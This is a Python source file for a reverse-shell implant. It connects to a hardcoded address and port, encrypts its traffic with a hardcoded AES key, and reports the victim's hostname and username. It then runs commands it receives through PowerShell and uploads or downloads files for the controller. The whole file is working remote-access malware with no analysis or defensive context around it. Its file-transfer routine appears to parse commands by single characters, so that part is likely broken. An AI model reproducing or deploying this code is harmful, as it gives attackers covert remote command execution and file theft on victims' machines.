import socket
import os
import subprocess
import getpass
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad

HOST = "192.168.140.65"
PORT = 6565
aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'


def encrypt_data(data):
    cipher = AES.new(aes_key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ciphertext

def decrypt_data(encrypted_data):
    iv = encrypted_data[:AES.block_size]
    ciphertext = encrypted_data[AES.block_size:]
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_data

def info(f,client):
    ff = f"\033[32m{f}\033[0m\n"
    client.send(encrypt_data(ff.encode('utf-8')))



def first_connect(client):
    client.send(encrypt_data(socket.gethostname().encode('utf-8')))
    answer = decrypt_data(client.recv(1024)).decode("utf-8")
    if answer == "whoareyou":
        client.send(encrypt_data(getpass.getuser().encode("utf-8")))


def connect():
    while 1:
        pwd = os.getcwd()
        client.send(encrypt_data(pwd.encode('utf-8')))
        response = decrypt_data(client.recv(40960))
        command = response.decode('utf-8')
        try:
            if command.split(" ")[0] == "cd":
                os.chdir(command.split(" ")[1])
            elif command == 'close':
                info("[*] Connection closed !!!",client)
                break
            elif command.split(" ")[0] == "ftp":
                stdout = ftp(command,client)
                info(stdout,client)
                continue
            stdout = subprocess.check_output(["powershell", "-Command",command])
        except :
            stdout = b"\033[32m[*] Command Not Found.\033[0m\n"
            
        if stdout:
            client.send(encrypt_data(stdout))
        else:
            client.send(encrypt_data(b"\n"))
        time.sleep(0.3)



def ftp(command,client):
    tip = command[1]
    file = command[2]


    def write(file,data):
        with open(file,'wb') as f:
            f.write(data)



    def read(file):
        with open(file,'rb') as f:
            return f.read() 
        

    def parse_chunks(data, chunk_size=409600):
        chunks = []
        for i in range(0, len(data), chunk_size):
            if i+ chunk_size < len(data):
                chunks.append(data[i:i + chunk_size])
            else : 
                chunks.append(data[i:len(data)])
        return chunks
    

    def download(file,client):
        size = int(client.recv(4096).decode('utf-8'))
        data = []
        client.send(b"ready")
        for i in range(size):
            chunk = client.recv(409600)
            data.append(chunk)
        binary_data = b''.join(data)  
        write(f"./{file}",binary_data)

    def upload(file,client):
        file = read(f".{file}")
        parse_file =parse_chunks(file)
        client.send(str(len(parse_file)).encode('utf-8'))
        client.recv(409600)
        for chunk in parse_file:
            client.send(chunk)
    
    if tip == "-u":
        download(file,client)
    elif tip == "-d":
        upload(file,client)
    else :
        return "[*] Wrong command !!!"  




client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))
first_connect(client)
while 1:
    command = decrypt_data(client.recv(40960)).decode("utf-8")
    match command:
            case "connect":
                connect()
            case "exit":
                client.close()
                break

